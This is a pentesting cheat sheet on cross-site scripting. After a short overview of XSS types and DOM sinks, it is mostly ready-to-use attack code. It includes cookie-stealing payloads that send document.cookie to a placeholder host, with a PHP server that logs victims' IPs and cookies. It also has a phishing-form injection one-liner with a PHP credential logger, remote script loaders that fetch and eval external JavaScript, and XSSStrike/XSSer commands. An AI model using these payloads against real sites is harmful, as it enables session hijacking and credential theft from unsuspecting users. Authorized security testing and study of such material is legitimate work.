# Basics
Cross-Site Scripting (XSS) is an attack where user controlled input gets executed on the victims client.
There are 3 main types of XSS:
    - Stored XSS (Gets stored in the Backend and usually persists over sessions)
    - Reflected gets passed to the beckend and executes the script on the client
    - DOM gets executed on the client only

XSS could also be blind which means while testing we might not see vulnerability right away. It is something to keep in mind, perhaps use payload which sends an callback to "our"/"testing" server.

Most commonly used JS functions that write to DOM object and where direct users input should be sanitized are:

- document.write()
- DOM.innerHTML
- DOM.outerHTML
- ...

jQuery functions:

- add()
- after()
- append()
- ...

Payload would usualy be formed like this:
```
- <script></script> tag
- JS Event Handlers like <img onload="">
- Using something like: javascript: url
- using eval function
- ...
```

Sometimes Payload needs to escape the intended function, usualy using something like this:

- `'>`
- `">`

Something handy for PenTesters/Bounty Hunters are Polyglot functions which incorporate different bypasses in single payload. Do have a look here: https://github.com/0xsobky/HackVault/wiki/Unleashing-an-Ultimate-XSS-Polyglot



## Cookie Stealer
```javascript
document.location='http://IP/index.php?c='+document.cookie;
new Image().src='http://IP/index.php?c='+document.cookie;
```

### Simple PHP Server that goes along
```php
<?php
if (isset($_GET['c'])) {
    $list = explode(";", $_GET['c']);
    foreach ($list as $key => $value) {
        $cookie = urldecode($value);
        $file = fopen("cookies.txt", "a+");
        fputs($file, "Victim IP: {$_SERVER['REMOTE_ADDR']} | Cookie: {$cookie}\n");
        fclose($file);
    }
}
?>
```

# Scripts
## Phishing HTML Form One-Liner
```javascript
document.write('<h3>Please login to continue</h3><form action=http://IP><input type="username" name="username" placeholder="Username"><input type="password" name="password" placeholder="Password"><input type="submit" name="submit" value="Login"></form>');document.getElementById('urlform').remove();
```

### Simple PHP Server to go along
Checking access log or having netcat would also work. Running simple server that logs callbacks is however very neat.
```php
<?php
if (isset($_GET['username']) && isset($_GET['password'])) {
    $file = fopen("credentials.txt", "a+");
    fputs($file, "Username: {$_GET['username']} | Password: {$_GET['password']}\n");
    header("Location: http://SERVERS_IP/phishing/index.php");
    fclose($file);
    exit();
}
?>
```
Save as php file and run it with `php -S x.x.x.x:PORT`

# More advanced payloads
Script will be loaded remotely
```
s = document.createElement("script")
s.src = "https://IP/payload.js"
document.body.appendChild(s)

fetch("https://IP/payload.js").then(r=>r.text()).then(t=>eval(t))

// either use decode base64 or eval on normal payload.
eval(atob(location.hash.substr(1)))
```

# Tools

## XSSStrike
```shell-session
python3 xsstrike.py -u "http://IP/?fullname=asd&username=asd&password=asd&email=XSS"
```

## XSSer
```
xsser -u http://IP -g "/?fullname=asd&username=asd&password=asd&email=XSS" --auto
```
